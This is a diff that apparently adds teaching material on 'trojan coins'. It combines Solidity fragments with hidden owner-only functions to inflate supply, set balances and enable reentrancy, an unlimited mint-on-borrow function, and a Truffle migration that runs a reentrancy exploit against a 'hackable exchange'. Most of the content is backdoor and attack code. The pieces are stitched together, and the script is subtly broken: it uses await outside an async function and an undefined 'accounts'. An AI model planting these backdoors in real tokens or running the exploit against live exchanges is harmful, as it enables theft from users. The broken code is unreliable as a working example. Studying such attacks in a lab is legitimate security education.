@@ -1,0 +1,114 @@
+// guided projects
+// trojan coins
+
+      //malicious functions that can throw off our example swap platform later
+       function setMarketplace(address marketplace) onlyOwner public{
+           marketplaceAddress = marketplace;
+       }
+
+       function activateRentry() onlyOwner public{
+           reentryActivated = true;
+       }
+       function deactivateRentry() onlyOwner public{
+           reentryActivated = false;
+       }
+       function activateSupplyHack() onlyOwner public{
+           updateSupplyActivated = true;
+       }
+       function deactivateSupplyHack() onlyOwner public{
+           updateSupplyActivated = false;
+       }
+
+
+
+       function updateReentryAmount(uint256 updatedAmount) onlyOwner public{
+           defaultReentryTradeAmount= updatedAmount;
+       }
+       function updateTotalSupplyAddAmount(uint256 updatedAmount) onlyOwner public{
+           defaultTotalSupplyToAdd= updatedAmount;
+
+       }
+       function updateSupply(uint256 updatedAmount) onlyOwner public{
+           _totalSupply= updatedAmount;
+
+       }
+
+       function updateBalance(uint256 updatedAmount) onlyOwner public{
+           balances[msg.sender]= updatedAmount;
+
+       }
+
+// flash loans = borrowing directly from the coin
+
+// BrickHint: For flash loans to work, you will need to enable the contract with a borrow function (below). Further, you will need to proivde this contract with liquidity so it can lend out funds.
+
+      function borrow(uint256 amount) public returns(bool){
+      _totalSupply = _totalSupply.add(amount);
+      transfer(msg.sender, amount);
+      return true;
+    }
+
+
+
+// hackable exchange
+
+const TrojanCoinAfter = artifacts.require("TrojanCoinAfter");
+const FlashLoanProvider1After = artifacts.require("FlashLoanProvider1After");
+const HackableExchange1After = artifacts.require("HackableExchange1After");
+const HackableExchange2After = artifacts.require("HackableExchange2After");
+
+
+const TrojanCoinBefore = artifacts.require("TrojanCoinBefore");
+const FlashLoanProvider1Before = artifacts.require("FlashLoanProvider1Before");
+const HackableExchange1Before = artifacts.require("HackableExchange1Before");
+const HackableExchange2Before = artifacts.require("HackableExchange2Before");
+
+module.exports = function(deployer) {
+
+  deployer.deploy(TrojanCoinBefore);
+  deployer.deploy(FlashLoanProvider1Before );
+  deployer.deploy(HackableExchange1Before);
+  deployer.deploy(HackableExchange2Before);
+
+  deployer.deploy(TrojanCoinAfter);
+  deployer.deploy(FlashLoanProvider1After );
+  deployer.deploy(HackableExchange1After);
+  deployer.deploy(HackableExchange2After);
+
+  //You will be changing all the afters to befores for this when you copy/paste
+          //First portion
+          coin = await TrojanCoinAfter.deployed();
+          coinSupply = parseInt(await coin.totalSupply.call());
+          console.log("coinSupply originally is " + coinSupply );
+          await coin.updateSupply('1100000000000000000000000');
+          newSupply = parseInt(await coin.totalSupply.call());
+          console.log("And now we will use one of our hacks to increase the coinSupply of trojancoin, so now it is: " + newSupply );
+
+
+
+
+          //Second portion
+          theContract = await HackableExchange1After.deployed();
+          fromToken = await TrojanCoinAfter.deployed();
+          flashPlatformWithDaiCoin = await FlashLoanProvider1After.deployed();
+
+          await fromToken.approve(theContract.address, '100000000000000000000000000000000');
+          amountTrading = 100000000;
+          await flashPlatformWithDaiCoin.mintTokensTo(theContract.address, amountTrading*2);
+          await fromToken.setMarketplace(theContract.address);
+          await fromToken.activateRentry()
+          startToTokenBalance = parseInt(await flashPlatformWithDaiCoin.balanceOf(accounts[0]));
+
+          //The actual hack is here:
+          await theContract.tokenToTokenSwap(fromToken.address, flashPlatformWithDaiCoin.address, amountTrading);
+
+          //if we wanted to check that we executed this properly...
+          endToTokenBalance = parseInt(await flashPlatformWithDaiCoin.balanceOf(accounts[0]));
+          actualAmount = endToTokenBalance - startToTokenBalance;
+          console.log(actualAmount)
+          supposedToAmount = parseInt(await theContract.getTokenPrice.call(amountTrading));
+          console.log("actual:"+ actualAmount)
+          console.log("supposed to be" + supposedToAmount);
+
+
+};
